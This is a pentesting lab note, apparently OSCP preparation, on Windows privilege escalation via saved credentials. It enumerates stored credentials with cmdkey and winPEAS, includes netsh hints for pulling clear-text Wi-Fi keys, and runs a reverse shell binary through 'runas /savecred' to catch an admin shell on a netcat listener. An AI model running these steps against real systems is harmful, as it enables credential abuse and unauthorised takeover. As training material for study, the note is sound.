
# Saved Creds
There is a way to bypass the `runas` command's password requirement. Windows allows users to save their credentials to the system, and these creds can be used with runas.
## Enumeration
### Manually w/ `cmdkey`
The `cmdkey` command with the `/list` flag will give us any currently stored credentials:
```powershell
PS C:\Users\admin> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WINDOWS-10-OSCP\admin
    Type: Domain Password
    User: WINDOWS-10-OSCP\admin
    Saved for this logon only

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02vgzarpftmpqvca
    Local machine persistence
```
### With winPEAS
You can use winPEAS with the `windowscreds` module to find saved credentials:
```powershell
.\winPEASany.exe quiet windowscreds
 ========================(Windows Credentials)=========================================

  [+] Checking Windows Vault()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
  [X] Exception: Object reference not set to an instance of an object.
    Not Found

  [+] Checking Credential manager()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    This function is not yet implemented.
    [i] If you want to list credentials inside Credential Manager use 'cmdkey /list'

  [+] Saved RDP connections()
    Not Found

  [+] Recently run commands()
    Not Found

  [+] Checking for DPAPI Master Keys()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-2377656024-3262854105-2837948313-1002\892309dd-47d9-41d8-acf5-97609f32564d
    Accessed: 7/28/2025 4:08:14 PM
    Modified: 7/24/2025 10:50:17 AM
   ===========================================================================

    MasterKey: C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-2377656024-3262854105-2837948313-1002\892309dd-47d9-41d8-acf5-97609f32564d
    Accessed: 7/28/2025 4:08:14 PM
    Modified: 7/24/2025 10:50:17 AM
   ==================================================================================

    MasterKey: C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-2377656024-3262854105-2837948313-1002\892309dd-47d9-41d8-acf5-97609f32564d
    Accessed: 7/28/2025 4:08:14 PM
    Modified: 7/24/2025 10:50:17 AM
   ===============================================================================

    [i] Follow the provided link for further instructions in how to decrypt the masterkey.

  [+] Checking for Credential Files()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    CredFile: C:\Users\admin\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: 892309dd-47d9-41d8-acf5-97609f32564d
    Accessed: 7/28/2025 6:01:25 PM
    Modified: 7/24/2025 10:50:20 AM
    Size: 11136
   ==================================================================================

    CredFile: C:\Users\user\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: 54d13d3c-af8c-4579-b11a-e963ed2fb556
    Accessed: 7/28/2025 6:01:25 PM
    Modified: 7/24/2025 1:28:38 PM
    Size: 11136
   ============================================================================

    CredFile: C:\Users\user\AppData\Roaming\Microsoft\Credentials\C88898D5A60ACE922AB95652143E5EA2
    Description: Enterprise Credential Data
    MasterKey: 54d13d3c-af8c-4579-b11a-e963ed2fb556
    Accessed: 7/28/2025 6:01:25 PM
    Modified: 7/24/2025 1:29:11 PM
    Size: 506
   ==============================================================================

    CredFile: C:\Users\vboxuser\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: 19b4c4d4-51cf-4e0f-86b8-c6d2b9ed3287
    Accessed: 7/28/2025 6:01:25 PM
    Modified: 7/24/2025 10:14:49 AM
    Size: 11136
   ============================================================================

    CredFile: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: 43e605ed-31e8-4018-b35f-329be590fed7
    Accessed: 7/28/2025 6:01:25 PM
    Modified: 7/24/2025 10:14:01 AM
    Size: 11136
   ==============================================================================

    [i] Follow the provided link for further instructions in how to decrypt the creds file

  [+] Checking for RDCMan Settings Files()
   [?] Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
    Not Found

  [+] Looking for kerberos tickets()
   [?]  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

  [+] Looking saved Wifis()
    This function is not yet implemented.
    [i] If you want to list saved Wifis connections you can list the using 'netsh wlan show profile'
    [i] If you want to get the clear-text password use 'netsh wlan show profile <SSID> key=clear'

  [+] Looking AppCmd.exe()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
    Not Found

  [+] Looking SSClient.exe()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
    Not Found

  [+] Checking AlwaysInstallElevated(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!

  [+] Checking WSUS(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    Not Found
```
## Exploitation
With saved creds for the `admin` user, we can run any command as them by giving `runas` the `/savecred` flag and the `/user` flag set to `admin`:
```powershell
PS C:\Users\admin> runas /savecred /user:admin reverse.exe
Attempting to start reverse.exe as user "WINDOWS-10-OSCP\admin" ...
```
In this case, we're using saved creds to run `reverse.exe` which is a reverse shell binary. If it works, then the output we see on our listener should be:
```bash
┌─[25-07-28 21:13:31]:(root@10.0.2.15)-[~/tibs]
└─# nc -lvp 44444
listening on [any] 44444 ...
10.0.69.5: inverse host lookup failed: Host name lookup failure
connect to [10.0.69.4] from (UNKNOWN) [10.0.69.5] 62222
Microsoft Windows [Version 10.0.19045.6093]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
windows-10-oscp\admin

C:\Windows\system32>
```